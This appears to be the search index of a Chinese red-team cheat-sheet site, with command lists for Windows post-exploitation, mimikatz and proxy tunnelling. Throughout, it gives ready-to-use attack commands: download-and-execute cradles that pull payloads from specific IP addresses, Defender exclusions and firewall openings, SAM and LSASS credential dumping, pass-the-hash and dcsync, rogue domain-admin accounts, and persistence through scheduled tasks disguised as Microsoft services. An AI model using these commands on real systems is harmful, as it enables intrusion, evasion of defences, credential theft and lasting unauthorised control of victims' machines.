\u67e5\u770b\u9632\u706b\u5899\u914d\u7f6e\uff1a netsh firewall show config Windows Server 2003 \u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0c\u5141\u8bb8\u6307\u5b9a\u7a0b\u5e8f\u5168\u90e8\u8fde\u63a5 netsh firewall add allowedprogram C:\\nc.exe \"allow nc\" enable Windows Server 2003\u4e4b\u540e\u7684\u7248\u672c netsh advfirewall firewall add rule name=\"pass nc\" dir in action=allow program=\"C:\\nc.exe \u5141\u8bb83389\u653e\u884c netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow WIndows Defender \u52a0\u767d\u6392\u9664\u76ee\u5f55\uff1a C:\\Windows\\System32\\wbem\\wmic.exe /Node:localhost /Namespace:\\\\Root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference call Add ExclusionPath=C:\\ powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath \"C:\\test\" \u6587\u4ef6\u5199\u5165 echo test > C:\\test.txt //\u5199\u5165-\u8986\u76d6 echo test >> c:\\test.txt //\u8ffd\u52a0\u6709\u6362\u884c set /p=test<nul>C:\\test.txt //\u5199\u5165 set /p=\"121d2\">>C:\\test.txt //\u4e0d\u6362\u884c\u8ffd\u52a0 //powershell\u4e0d\u6362\u884c\u8ffd\u52a0 powershell -Command \"[System.IO.File]::AppendAllText('C:\\windows\\temp\\111.txt', 'test')\" //\u89c4\u907f\u7a7a\u683c echo.123>>a.txt echo,123>>a.txt type;a.txt //\u5c06base64\u7f16\u7801\u7684\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -f -decode base64.txt C:\\\\test.jsp //\u5c06\u5341\u516d\u8fdb\u5236\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -decodehex hex.txt C:\\\\test.jsp \u6ce8\u518c\u8868\uff1a Restricted Admin Mode \u5bf9\u5e94\u547d\u4ee4\u884c\u5f00\u542f Restricted Admin mode \u547d\u4ee4\u5982\u4e0b\uff1a REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f \u67e5\u770b\u662f\u5426\u5df2\u5f00\u542f DisableRestrictedAdmin REG_DWORD 0x0 \u5b58\u5728\u5c31\u662f\u5f00\u542f REG query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" | findstr \"DisableRestrictedAdmin\" \u67e5\u770b3389\u7aef\u53e3 REG query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber https://forum.ywhack.com/coding.php \u7aef\u53e3\u67e5\u8be2 \u5f00\u542f\u8fdc\u7a0b\u684c\u9762 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f \u6216\u8005 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 \u5bfc\u51fa SAM \u6570\u636e\u5e93 reg save HKLM\\SYSTEM sys.hiv reg save HKLM\\SAM sam.hiv \u590d\u5236\uff1a C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SAM \u4f7f\u7528 https://github.com/3gstudent/NinjaCopy \u8fdb\u884c\u590d\u5236\u3002 lsadump::sam /sam:sam.hiv /system:system.hiv \u67e5\u770b\u76d8\u7b26\u5269\u4f59\u7a7a\u95f4 ## \u5927\u5c0f\u4e3a\u5b57\u8282\u78c1\u76d8 ::\u67e5\u770bC\u76d8 wmic LogicalDisk where \"Caption='C:'\" get FreeSpace,Size /value ::\u67e5\u770bD\u76d8 wmic LogicalDisk where \"Caption='D:'\" get FreeSpace,Size /value \u641c\u7d22\u6587\u4ef6\uff1a #\u641c\u7d22 D \u76d8\u4e0b\u540d\u4e3a shell.jsp \u7684\u6587\u4ef6 cd /d D:\\ && dir /b /s shell.jsp #\u641c\u7d20 D \u76d8\u4e0b\u540e\u7f00\u4e3a conf \u5185\u5bb9\u4e14\u5305\u542b password\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09: findstr /s /i /n /d:D:\\ \"password\" *.conf CS \u4e0a\u7ebf powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://122.114.55.117:8012/download/upload.ps1') msiexec /q /i http://127.0.0.1:8080/ms10-051.msi \u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027 attrib +s +a +h +r cs.exe // \u7ed9\u6587\u4ef6\u8bbe\u7f6e\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027 \u8ba1\u5212\u4efb\u52a1 schtasks /create /ru system /tn \"Microsoft\\Windows\\Multimedia\\SystemMediaService\" /sc ONSTART /tr \"C:\\cs.exe\" // \u521b\u5efa\u4e00\u4e2a\u540d\u4e3aMicrosoft\\Windows\\Multimedia\\SystemMediaService\uff0c\u5f00\u673a\u65f6\u6267\u884c c:\\cs.exe \u7684\u8ba1 \u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 schtasks /change /tn \"Microsoft\\Windows\\Multimedia\\SystemSoundsService\" /ru system /tr \"C:\\cs.exe\" /enable // \u4fee\u6539Microsoft\\Windows\\Multimedia\\SystemSoundsService \u8ba1\u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c \u66f4\u6539\u4efb\u52a1\u65e0\u6cd5\u901a\u8fc7 /sc\u3001/mo \u53c2\u6570\u66f4\u6539\u8ba1\u5212\u9891\u7387 RDP \u51ed\u636e #\u5217\u51fa\u6240\u6709 RDP \u51ed\u8bc1 C:\\Users\\\u7528\u6237\u540d\\AppData\\Local\\Microsoft\\Credentials dir /a C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials Windows \u6253\u5305\u76ee\u5f55\u4e0a\u4f20\u6587\u4ef6 powershell -Command \"Compress-Archive -Path E:\\update\\ -DestinationPath E:\\test.zip\" 7z.exe a -r -p12345 C:\\webs\\1.7z C:\\webs\\ zip -r C:\\webs\\1.zip C:\\webs\\ \u57df\u6e17\u900f\u547d\u4ee4 whoami /user //\u67e5\u770b\u5f53\u524d\u7528\u6237\u6743\u9650 net config workstation //\u53ef\u77e5\u57df\u540d\u548c\u5176\u4ed6\u4fe1\u606f net user /domain //\u67e5\u8be2\u57df\u7528\u6237 net user edgeuser Admin12345 /add /domain //\u6dfb\u52a0\u57df\u7528\u6237 net group \"domain admins\" edgeuser /add /domain //\u6dfb\u52a0\u57df\u7ba1\u7406\u5458 net group \"enterprise admins\" edgeuser /add /domain //\u6dfb\u52a0\u4f01\u4e1a\u7ba1\u7406\u5458 net group \"domain admins\" /domain //\u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237 net group \"enterprise admins\" /domain //\u67e5\u8be2\u57df\u4f01\u4e1a\u7ba1\u7406\u7ec4 net localgroup administrators /domain //\u67e5\u8be2\u57df\u672c\u5730\u7ba1\u7406\u7ec4 net time /domain //\u67e5\u8be2\u57df\u63a7\u5236\u5668\u548c\u65f6\u95f4 net view /domain //\u67e5\u8be2\u57df\u540d\u79f0 net view /domain:redteam.local //\u67e5\u8be2\u57df\u5185\u8ba1\u7b97\u673a net group \"domain computers\" /domain //\u67e5\u770b\u5f53\u524d\u57df\u5185\u8ba1\u7b97\u673a\u5217\u8868 net group \"domain controllers\" /domain //\u67e5\u770b\u57df\u63a7\u673a\u5668\u540d net accounts /domain //\u67e5\u770b\u57df\u5bc6\u7801\u7b56\u7565 nltest /domain_trusts //\u67e5\u770b\u57df\u4fe1\u4efb nltest /domain_trusts /all_trusts /v /server:10.10.10.10 //\u67e5\u770b\u67d0\u4e2a\u57df\u7684\u57df\u4fe1\u4efb nslookup -type=SRV _ldap._tcp.corp //\u901a\u8fc7srv\u8bb0\u5f55\u67e5\u627e\u57df\u63a7\u5236\u5668","title":"Windows \u547d\u4ee4\u901f\u67e5"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#windows","text":"","title":"Windows \u547d\u4ee4\u901f\u67e5"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#tcp","text":"powershell Test-NetConnection -ComputerName [\u76ee\u6807\u4e3b\u673a\u540d\u6216IP] -Port [\u7aef\u53e3\u53f7]","title":"TCP \u51fa\u7f51\u63a2\u6d4b"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_1","text":"","title":"\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#certutil","text":"certutil.exe -urlcache -split -f \"http://127.0.0.1:8080/file.exe\" \"C:/Windows/temp/file.exe\" //\u4ece http://127.0.0.1:8080/ \u4e0b\u8f7d file.exe \u5e76\u4fdd\u5b58\u5230 C:/Windows/temp/file.exe","title":"certutil"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#powershell","text":"powershell -Command \"Invoke-WebRequest -Uri 'https://www.example.com/file.zip' -OutFile 'C:\\Downloads\\file.zip'\"","title":"PowerShell"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#bitsadmin","text":"bitsadmin /transfer \"JobName\" /download /priority normal https://www.example.com/file.zip C:\\path\\to\\save\\file.zip","title":"BitsAdmin"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#rundll32","text":"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.3.150/chfs/shared/1Z3.exe\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}","title":"rundll32"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#iis","text":"\u67e5\u770b IIS \u7ed1\u5b9a\u7684\u7f51\u7ad9\uff1a %windir%\\system32\\inetsrv\\appcmd.exe list sites \u67e5\u770b Site ID \u4e3a 1 \u7684\u7269\u7406\u8def\u5f84\uff1a %windir%\\system32\\inetsrv\\appcmd list site /site.id:1 /config | findstr \"physicalPath\" IIS \u914d\u7f6e\u6587\u4ef6\uff1a C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config %SystemRoot%\\System32\\inetsrv\\config\\applicationHost.config","title":"IIS \u7f51\u7ad9\u67e5\u8be2"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#windows_1","text":"wmic os get Caption,osarchitecture","title":"\u67e5\u770b Windows \u7cfb\u7edf\u7248\u672c\uff1a"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_2","text":"powershell -command \"(Get-Item 'C:\\path\\to\\your\\file.txt').CreationTime = '2024-01-01 12:00 AM'; (Get-Item 'C:\\path\\to\\your\\file.txt').LastWriteTime = '2024-01-02 12:00 AM'\"","title":"\u4fee\u6539\u6587\u4ef6\u65f6\u95f4"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_3","text":"\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94 PID\uff1a netstat -ano | findstr :80 \u67e5\u770b PID \u5bf9\u5e94\u7a0b\u5e8f\uff1a tasklist /FI \"PID eq 1234\" \u6839\u636e PID \u67e5\u770b\u7a0b\u5e8f\u6240\u5728\u76ee\u5f55\uff1a wmic process where ProcessId=1234 get ExecutablePath \u6267\u884c\u8fdb\u7a0b\uff1a start /b xxx.exe \u6839\u636e\u540d\u79f0\u7ed3\u675f\u8fdb\u7a0b\uff1a taskkill /f /t /im GotoHTTP.exe \u641c\u7d22\u8fdb\u7a0b tasklist | findstr \"powershell\"","title":"\u8fdb\u7a0b\u64cd\u4f5c"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#powershell-exe","text":"powershell -executionPolicy bypass Start-Process -WindowStyle hidden -FilePath 'C:/Windows/temp/rd.exe'","title":"Powershell \u65e0\u7a97\u53e3\u6267\u884c EXE"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#net","text":"\u67e5\u770b\u7528\u6237\u5217\u8868: net user powershell\u67e5\u770b\u7528\u6237\u5217\u8868: Get-WmiObject -Class Win32_UserAccount \u67e5\u770b\u7528\u6237\u7ec4\u5217\u8868: net localgroup \u67e5\u770b\u7ba1\u7406\u7ec4\u5217\u8868: net localgroup Administrators \u6dfb\u52a0\u7528\u6237\u5e76\u8bbe\u7f6e\u5bc6\u7801: net user test P@ssw0rd /add \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup Administrators test /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u6fc0\u6d3bguest\u7528\u6237: net user guest /active:yes \u66f4\u6539guest\u7528\u6237\u7684\u5bc6\u7801: net user guest P@ssw0rd \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup administrators guest /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u67e5\u770b\u672c\u5730\u5bc6\u7801\u7b56\u7565: net accounts \u67e5\u770b\u5f53\u524d\u4f1a\u8bdd: net session \u5efa\u7acbIPC\u4f1a\u8bdd: net use \\\\127.0.0.1\\c$ \"P@ssw0rd\" /user:\"domain\\Administrator\"","title":"net \u547d\u4ee4"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#netsh","text":"\u67e5\u770b\u9632\u706b\u5899\u914d\u7f6e\uff1a netsh firewall show config Windows Server 2003 \u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0c\u5141\u8bb8\u6307\u5b9a\u7a0b\u5e8f\u5168\u90e8\u8fde\u63a5 netsh firewall add allowedprogram C:\\nc.exe \"allow nc\" enable Windows Server 2003\u4e4b\u540e\u7684\u7248\u672c netsh advfirewall firewall add rule name=\"pass nc\" dir in action=allow program=\"C:\\nc.exe \u5141\u8bb83389\u653e\u884c netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow","title":"netsh \u64cd\u4f5c\u9632\u706b\u5899"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#windows-defender","text":"C:\\Windows\\System32\\wbem\\wmic.exe /Node:localhost /Namespace:\\\\Root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference call Add ExclusionPath=C:\\ powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath \"C:\\test\"","title":"WIndows Defender \u52a0\u767d\u6392\u9664\u76ee\u5f55\uff1a"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_4","text":"echo test > C:\\test.txt //\u5199\u5165-\u8986\u76d6 echo test >> c:\\test.txt //\u8ffd\u52a0\u6709\u6362\u884c set /p=test<nul>C:\\test.txt //\u5199\u5165 set /p=\"121d2\">>C:\\test.txt //\u4e0d\u6362\u884c\u8ffd\u52a0 //powershell\u4e0d\u6362\u884c\u8ffd\u52a0 powershell -Command \"[System.IO.File]::AppendAllText('C:\\windows\\temp\\111.txt', 'test')\" //\u89c4\u907f\u7a7a\u683c echo.123>>a.txt echo,123>>a.txt type;a.txt //\u5c06base64\u7f16\u7801\u7684\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -f -decode base64.txt C:\\\\test.jsp //\u5c06\u5341\u516d\u8fdb\u5236\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -decodehex hex.txt C:\\\\test.jsp","title":"\u6587\u4ef6\u5199\u5165"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_5","text":"","title":"\u6ce8\u518c\u8868\uff1a"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#restricted-admin-mode","text":"\u5bf9\u5e94\u547d\u4ee4\u884c\u5f00\u542f Restricted Admin mode \u547d\u4ee4\u5982\u4e0b\uff1a REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f \u67e5\u770b\u662f\u5426\u5df2\u5f00\u542f DisableRestrictedAdmin REG_DWORD 0x0 \u5b58\u5728\u5c31\u662f\u5f00\u542f REG query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" | findstr \"DisableRestrictedAdmin\"","title":"Restricted Admin Mode"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#3389","text":"REG query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber https://forum.ywhack.com/coding.php \u7aef\u53e3\u67e5\u8be2","title":"\u67e5\u770b3389\u7aef\u53e3"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_6","text":"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f \u6216\u8005 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1","title":"\u5f00\u542f\u8fdc\u7a0b\u684c\u9762"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#sam","text":"reg save HKLM\\SYSTEM sys.hiv reg save HKLM\\SAM sam.hiv \u590d\u5236\uff1a C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SAM \u4f7f\u7528 https://github.com/3gstudent/NinjaCopy \u8fdb\u884c\u590d\u5236\u3002 lsadump::sam /sam:sam.hiv /system:system.hiv","title":"\u5bfc\u51fa SAM \u6570\u636e\u5e93"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_7","text":"## \u5927\u5c0f\u4e3a\u5b57\u8282\u78c1\u76d8 ::\u67e5\u770bC\u76d8 wmic LogicalDisk where \"Caption='C:'\" get FreeSpace,Size /value ::\u67e5\u770bD\u76d8 wmic LogicalDisk where \"Caption='D:'\" get FreeSpace,Size /value","title":"\u67e5\u770b\u76d8\u7b26\u5269\u4f59\u7a7a\u95f4"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_8","text":"#\u641c\u7d22 D \u76d8\u4e0b\u540d\u4e3a shell.jsp \u7684\u6587\u4ef6 cd /d D:\\ && dir /b /s shell.jsp #\u641c\u7d20 D \u76d8\u4e0b\u540e\u7f00\u4e3a conf \u5185\u5bb9\u4e14\u5305\u542b password\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09: findstr /s /i /n /d:D:\\ \"password\" *.conf","title":"\u641c\u7d22\u6587\u4ef6\uff1a"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#cs","text":"powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://122.114.55.117:8012/download/upload.ps1') msiexec /q /i http://127.0.0.1:8080/ms10-051.msi","title":"CS \u4e0a\u7ebf"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_9","text":"attrib +s +a +h +r cs.exe // \u7ed9\u6587\u4ef6\u8bbe\u7f6e\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027","title":"\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_10","text":"schtasks /create /ru system /tn \"Microsoft\\Windows\\Multimedia\\SystemMediaService\" /sc ONSTART /tr \"C:\\cs.exe\" // \u521b\u5efa\u4e00\u4e2a\u540d\u4e3aMicrosoft\\Windows\\Multimedia\\SystemMediaService\uff0c\u5f00\u673a\u65f6\u6267\u884c c:\\cs.exe \u7684\u8ba1 \u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 schtasks /change /tn \"Microsoft\\Windows\\Multimedia\\SystemSoundsService\" /ru system /tr \"C:\\cs.exe\" /enable // \u4fee\u6539Microsoft\\Windows\\Multimedia\\SystemSoundsService \u8ba1\u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c \u66f4\u6539\u4efb\u52a1\u65e0\u6cd5\u901a\u8fc7 /sc\u3001/mo \u53c2\u6570\u66f4\u6539\u8ba1\u5212\u9891\u7387","title":"\u8ba1\u5212\u4efb\u52a1"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#rdp","text":"#\u5217\u51fa\u6240\u6709 RDP \u51ed\u8bc1 C:\\Users\\\u7528\u6237\u540d\\AppData\\Local\\Microsoft\\Credentials dir /a C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials","title":"RDP \u51ed\u636e"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#windows_2","text":"powershell -Command \"Compress-Archive -Path E:\\update\\ -DestinationPath E:\\test.zip\" 7z.exe a -r -p12345 C:\\webs\\1.7z C:\\webs\\ zip -r C:\\webs\\1.zip C:\\webs\\","title":"Windows \u6253\u5305\u76ee\u5f55\u4e0a\u4f20\u6587\u4ef6"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_11","text":"whoami /user //\u67e5\u770b\u5f53\u524d\u7528\u6237\u6743\u9650 net config workstation //\u53ef\u77e5\u57df\u540d\u548c\u5176\u4ed6\u4fe1\u606f net user /domain //\u67e5\u8be2\u57df\u7528\u6237 net user edgeuser Admin12345 /add /domain //\u6dfb\u52a0\u57df\u7528\u6237 net group \"domain admins\" edgeuser /add /domain //\u6dfb\u52a0\u57df\u7ba1\u7406\u5458 net group \"enterprise admins\" edgeuser /add /domain //\u6dfb\u52a0\u4f01\u4e1a\u7ba1\u7406\u5458 net group \"domain admins\" /domain //\u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237 net group \"enterprise admins\" /domain //\u67e5\u8be2\u57df\u4f01\u4e1a\u7ba1\u7406\u7ec4 net localgroup administrators /domain //\u67e5\u8be2\u57df\u672c\u5730\u7ba1\u7406\u7ec4 net time /domain //\u67e5\u8be2\u57df\u63a7\u5236\u5668\u548c\u65f6\u95f4 net view /domain //\u67e5\u8be2\u57df\u540d\u79f0 net view /domain:redteam.local //\u67e5\u8be2\u57df\u5185\u8ba1\u7b97\u673a net group \"domain computers\" /domain //\u67e5\u770b\u5f53\u524d\u57df\u5185\u8ba1\u7b97\u673a\u5217\u8868 net group \"domain controllers\" /domain //\u67e5\u770b\u57df\u63a7\u673a\u5668\u540d net accounts /domain //\u67e5\u770b\u57df\u5bc6\u7801\u7b56\u7565 nltest /domain_trusts //\u67e5\u770b\u57df\u4fe1\u4efb nltest /domain_trusts /all_trusts /v /server:10.10.10.10 //\u67e5\u770b\u67d0\u4e2a\u57df\u7684\u57df\u4fe1\u4efb nslookup -type=SRV _ldap._tcp.corp //\u901a\u8fc7srv\u8bb0\u5f55\u67e5\u627e\u57df\u63a7\u5236\u5668","title":"\u57df\u6e17\u900f\u547d\u4ee4"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/","text":"mimikatz \u5b98\u65b9 Github\uff1ahttps://github.com/gentilkiwi/mimikatz \u83b7\u53d6\u767b\u5f55\u51ed\u8bc1\u4fe1\u606f mimikatz.exe log \"privilege::debug\" \"sekurlsa::logonpasswords\" exit privilege::debug sekurlsa::logonpasswords lsass.exe \u5bfc\u51fa\u51ed\u636e mimikatz.exe log \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit mimikatz PTH \u4f20\u9012 cmd mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:cmd.exe\" \"exit\" mimikatz PTH \u4f20\u9012 mstsc mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:mstsc.exe /restrictedadmin\" \"exit\" privilege::debug sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 \"/run:mstsc.exe /restrictedadmin\" SAM \u6570\u636e\u5e93\u5bfc\u51fa\u51ed\u636e mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\" bat \u811a\u672c\u83b7\u53d6\u51ed\u636e @echo off cd /d D:\\tools\\ mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\\windows\\temp\\log.txt \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237hash mimikatz.exe \"lsadump::dcsync /domain:test.com /all /csv\" exit","title":"mimikatz"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#mimikatz","text":"\u5b98\u65b9 Github\uff1ahttps://github.com/gentilkiwi/mimikatz","title":"mimikatz"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#_1","text":"mimikatz.exe log \"privilege::debug\" \"sekurlsa::logonpasswords\" exit privilege::debug sekurlsa::logonpasswords","title":"\u83b7\u53d6\u767b\u5f55\u51ed\u8bc1\u4fe1\u606f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#lsassexe","text":"mimikatz.exe log \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit","title":"lsass.exe \u5bfc\u51fa\u51ed\u636e"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#mimikatz-pth-cmd","text":"mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:cmd.exe\" \"exit\"","title":"mimikatz PTH \u4f20\u9012 cmd"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#mimikatz-pth-mstsc","text":"mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:mstsc.exe /restrictedadmin\" \"exit\" privilege::debug sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 \"/run:mstsc.exe /restrictedadmin\"","title":"mimikatz PTH \u4f20\u9012 mstsc"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#sam","text":"mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\"","title":"SAM \u6570\u636e\u5e93\u5bfc\u51fa\u51ed\u636e"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#bat","text":"@echo off cd /d D:\\tools\\ mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\\windows\\temp\\log.txt","title":"bat \u811a\u672c\u83b7\u53d6\u51ed\u636e"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#hash","text":"mimikatz.exe \"lsadump::dcsync /domain:test.com /all /csv\" exit","title":"\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237hash"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/","text":"proxy tools iox \u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/EddieIvan01/iox proxy \u5728\u672c\u5730 0.0.0.0:1080\u542f\u52a8Socks5\u670d\u52a1 ./iox proxy -l 1080 \u52a0\u5bc6\u8f6c\u53d1 socks5 \u4ee3\u7406\uff1a VPS \u76d1\u542c(//\u5c061080\u7aef\u53e3\u76d1\u542c\u5230\u7684\u6d41\u91cf\u8f6c\u53d1\u81f350054\u7aef\u53e3): nohup ./iox proxy -l 50054 -l 1081 -k 3211 > iox.log & 